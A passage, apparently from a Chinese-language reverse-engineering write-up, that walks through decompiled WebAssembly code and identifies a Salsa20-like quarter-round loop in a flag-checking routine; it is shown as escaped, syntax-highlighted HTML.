  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v52) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;wasm 是基于堆栈的，这里明显能看到栈的痕迹，上来先把第一个参数（输入字符串的地址）存到了 &lt;code&gt;v6+40&lt;/code&gt; 的地方（猜测v6是栈顶）&lt;/p&gt;
&lt;p&gt;通过第一条 if 比较，猜测 v52 是输入的最后一位，这样就可以知道 &lt;code&gt;w2c_f25&lt;/code&gt; 是计算长度，&lt;code&gt;w2c_f21&lt;/code&gt; 相当于 &lt;code&gt;a1[a2]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来注意到中间有一个非常整齐的循环&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt; )
      {
        v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v22, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCu&lt;/span&gt;);
        v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v23, &lt;span style=&#34;color:#ae81ff&#34;&gt;5u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1u&lt;/span&gt;);
        v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v24, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6u&lt;/span&gt;);
        v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v25, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBu&lt;/span&gt;);
        v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v26, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3u&lt;/span&gt;);
        v27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v27, &lt;span style=&#34;color:#ae81ff&#34;&gt;5u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4u&lt;/span&gt;);
        v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v28, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;);
        v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        w2c_f23(v29, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt;);
        v57 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;, v57);
      }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然 &lt;code&gt;v6+12&lt;/code&gt; 的地方存的是循环次数，这个格式和前段时间学的 &lt;code&gt;salsa20&lt;/code&gt; 很像&lt;/p&gt;
&lt;p&gt;查看 &lt;code&gt;w2c_f23&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(w2c_g0 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, a1);
  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;, a2);
  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;, a3);
  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;, a4);
  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;, a5);
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v10;
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v11);
  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v13;
  v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v14);
  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v16;
  v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v17);
  v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v19;
  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v20);
  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v22;
  v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v21 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v18) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v12))) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v23);
  i32_store8(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v23, v24);            &lt;span style=&#34;color:#75715e&#34;&gt;// x[b] ^= ROL((x[d] + x[a]), 1)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v25;
  v27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v26);
  v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v28;
  v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v29);
  v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v31;
  v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v32);
  v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v34;
  v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v35);
  v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v37;
  v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v36 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v33) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v30 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v27))) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v38);
  i32_store8(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v38, v39);            &lt;span style=&#34;color:#75715e&#34;&gt;// x[c] ^= ROL((x[a] + x[b]), 2)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v40;
  v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v41);
  v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v43;
  v45 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v44);
  v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v47 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v46;
  v48 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v47);
  v49 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v50 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v49;
  v51 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v50);
  v52 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v53 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v52;
  v54 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v51 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v48) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v45 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v42))) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v53);
  i32_store8(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v53, v54);            &lt;span style=&#34;color:#75715e&#34;&gt;// x[d] ^= ROL((x[b] + x[c]), 3)
